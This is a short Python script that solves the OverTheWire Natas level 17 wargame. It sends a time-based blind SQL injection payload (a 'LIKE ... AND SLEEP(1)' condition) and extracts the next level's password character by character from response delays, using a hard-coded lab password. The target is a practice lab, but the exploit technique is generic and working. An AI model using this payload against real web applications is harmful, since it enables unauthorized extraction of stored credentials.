import requests
import string

username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
passwordLen = len(password)
bruteforce = string.ascii_letters + string.digits
correctPwd = ''

url = 'http://{0}:{1}@{0}.natas.labs.overthewire.org/index.php'.format(username, password)

# print('Query: {}'.format(query))
# print('Respond: {}'.format(respond.text))
# print('Elapsed: {}'.format(respond.elapsed.total_seconds()))
# print('Elapsed: {}'.format(str(respond.elapsed.total_seconds()).split('.')[0]))
# print('Password Length: {}'.format(passwordLen))

for size in range(passwordLen):

    print("Round {}/{}".format(size, passwordLen))

    for char in bruteforce:
        query = '{0}?username=natas18%22+AND+BINARY+password+LIKE+%27{1}%25%27+AND+SLEEP%281%29+%23'.format(url, correctPwd+char)
        # query = '{0}?username=natas18"+AND+BINARY+password+LIKE+'{1}%'+AND+SLEEP(1)+ #'.format(url, correctPwd+char) #

        respond = requests.get(query)
        time = respond.elapsed.total_seconds()

        print("Trying: {0} {1}".format(char, time))

        if time > 1:
            correctPwd += char
            print('*************** Found: {0}'.format(correctPwd))
            break